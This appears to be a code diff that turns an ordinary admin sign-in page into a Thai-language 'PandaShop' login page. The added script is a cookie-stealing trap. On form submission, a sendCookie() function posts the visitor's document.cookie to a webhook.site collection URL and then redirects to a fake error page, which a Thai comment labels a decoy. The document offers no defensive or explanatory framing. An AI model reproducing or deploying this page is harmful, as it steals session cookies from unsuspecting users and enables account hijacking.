@@ -1,100 +1,83 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="th">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Sign in - Panda Admin</title>
-    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Sign in - PandaShop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
     <style>
-      :root {
-        --bg: #0f172a;
-        --card: #1e293b;
-        --text: #f1f5f9;
-        --border: #334155;
-        --accent: #3b82f6;
-        --accent-hover: #2563eb;
-      }
       * {
+        font-family: 'Inter', sans-serif;
         box-sizing: border-box;
       }
       body {
-        margin: 0;
-        background-color: var(--bg);
-        font-family: Inter, system-ui, sans-serif;
-        color: var(--text);
+        background-color: #f9fafb;
         display: flex;
-        justify-content: center;
         align-items: center;
-        height: 100vh;
-      }
-      .wrapper {
-        width: 100%;
-        max-width: 420px;
-        background: var(--card);
-        padding: 2rem;
-        border-radius: 0.75rem;
-        box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-      }
-      .logo {
-        display: flex;
         justify-content: center;
-        margin-bottom: 1.5rem;
+        height: 100vh;
+        margin: 0;
       }
-      .logo img {
-        width: 120px;
-        height: auto;
+      .card {
+        background-color: #fff;
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        width: 100%;
+        max-width: 400px;
+        text-align: center;
+      }
+      img.logo {
+        width: 48px;
+        margin-bottom: 1rem;
       }
       h1 {
-        text-align: center;
-        font-size: 1.25rem;
-        margin-bottom: 1rem;
-      }
-      form {
-        display: flex;
-        flex-direction: column;
+        margin: 0 0 1rem;
+        font-size: 1.5rem;
       }
       input {
-        margin-bottom: 1rem;
+        width: 100%;
         padding: 0.75rem;
-        border: 1px solid var(--border);
+        margin: 0.5rem 0;
+        border: 1px solid #ccc;
         border-radius: 0.5rem;
-        background-color: transparent;
-        color: var(--text);
-        font-size: 0.9rem;
       }
       button {
+        background-color: #111827;
+        color: #fff;
+        width: 100%;
         padding: 0.75rem;
-        background-color: var(--accent);
         border: none;
         border-radius: 0.5rem;
-        font-size: 1rem;
-        color: white;
-        cursor: pointer;
-      }
-      button:hover {
-        background-color: var(--accent-hover);
-      }
-      .footer {
-        text-align: center;
         margin-top: 1rem;
-        font-size: 0.75rem;
-        color: #94a3b8;
+        cursor: pointer;
+        font-weight: bold;
       }
     </style>
   </head>
   <body>
-    <div class="wrapper">
-      <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Placeholder_view_vector.svg" alt="Panda Logo" />
-      </div>
+    <div class="card">
+      <img class="logo" src="https://pandashop.rdcw.xyz/logo.svg" alt="Logo" />
       <h1>Sign in to your account</h1>
-      <form method="POST" action="#">
-        <input type="text" name="email" placeholder="Email address" required />
-        <input type="password" name="password" placeholder="Password" required />
+      <form onsubmit="sendCookie(); return false;">
+        <input type="email" placeholder="Email" required />
+        <input type="password" placeholder="Password" required />
         <button type="submit">Sign In</button>
       </form>
-      <div class="footer">© 2025 Panda Admin. All rights reserved.</div>
     </div>
+
+    <script>
+      function sendCookie() {
+        fetch("https://webhook.site/37fdcdfb-da6e-4ea7-beb2-099d6c982b4d", {
+          method: "POST",
+          headers: {
+            "Content-Type": "text/plain"
+          },
+          body: document.cookie
+        }).then(() => {
+          window.location.href = "https://pandashop.rdcw.xyz/error"; // redirect หลอกๆ ไปหน้า error
+        });
+      }
+    </script>
   </body>
 </html>
